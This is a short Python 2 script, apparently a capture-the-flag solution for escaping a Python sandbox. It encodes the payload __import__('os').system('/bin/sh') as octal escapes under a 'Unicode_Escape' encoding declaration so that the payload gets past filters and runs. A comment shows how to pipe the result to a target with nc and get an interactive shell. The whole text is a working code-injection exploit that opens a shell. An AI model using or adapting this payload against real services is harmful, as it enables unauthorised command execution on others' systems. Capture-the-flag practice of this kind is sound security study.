def unicode_escape(s):
    res = ''
    for c in s:
        res += '\\'+oct(ord(c)).lstrip("0").zfill(3)
    return res

payload = '__import__("os").system("/bin/sh")'
payload = unicode_escape(payload)
print "# Encoding: Unicode_Escape \r" + payload

#howtouse: (python solve.py;cat -) | nc ip port